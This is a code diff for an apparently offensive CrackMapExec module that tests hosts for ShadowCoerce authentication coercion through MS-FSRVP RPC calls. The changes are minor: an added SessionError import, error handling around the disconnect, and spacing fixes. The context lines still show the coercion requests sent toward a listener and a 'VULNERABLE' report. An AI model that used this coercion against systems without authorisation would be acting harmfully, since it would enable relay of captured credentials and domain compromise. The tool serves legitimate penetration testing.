@@ -10,6 +10,8 @@ from impacket.dcerpc.v5.dtypes import BOOL, LONG, WSTR, LPWSTR
 from impacket.uuid import uuidtup_to_bin
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
+from impacket.smbconnection import SessionError
+
 
 class CMEModule:
     
@@ -52,7 +54,10 @@ class CMEModule:
             logging.debug("Using the default IsPathSupported")
             result = c.IsPathSupported(dce, self.listener)
 
-        dce.disconnect()
+        try:
+            dce.disconnect()
+        except SessionError as e:
+            logging.debug(f"Error disconnecting DCE session: {e}")
 
         if result: 
             context.log.highlight("VULNERABLE")
@@ -60,6 +65,7 @@ class CMEModule:
         
         else:
             logging.debug("Target not vulnerable to ShadowCoerce")
+
 
 class DCERPCSessionError(DCERPCException):
     def __init__(self, error_string=None, error_code=None, packet=None):
@@ -75,6 +81,7 @@ class DCERPCSessionError(DCERPCException):
             return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
         else:
             return 'SessionError: unknown error code: 0x%x' % self.error_code
+
 
 ################################################################################
 # Error Codes
@@ -103,11 +110,13 @@ class IsPathSupported(NDRCALL):
         ('ShareName', WSTR),
     )
 
+
 class IsPathSupportedResponse(NDRCALL):
     structure = (
         ('SupportedByThisProvider', BOOL),
         ('OwnerMachineName', LPWSTR),
     )
+
 
 class IsPathShadowCopied(NDRCALL):
     opnum = 9
@@ -115,16 +124,19 @@ class IsPathShadowCopied(NDRCALL):
         ('ShareName', WSTR),
     )
 
+
 class IsPathShadowCopiedResponse(NDRCALL):
     structure = (
         ('ShadowCopyPresent', BOOL),
         ('ShadowCopyCompatibility', LONG),
     )
 
+
 OPNUMS = {
     8 : (IsPathSupported, IsPathSupportedResponse),
     9 : (IsPathShadowCopied, IsPathShadowCopiedResponse),
 }
+
 
 class CoerceAuth():
     def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost):
@@ -170,7 +182,6 @@ class CoerceAuth():
         logging.debug("Successfully bound!")
         return dce
 
-
     def IsPathShadowCopied(self, dce, listener):
         logging.debug("Sending IsPathShadowCopied!")
         try:
@@ -200,4 +211,4 @@ class CoerceAuth():
             logging.debug("Attack may of may not have worked, check your listener...")
             return False 
 
-        return True 
+        return True
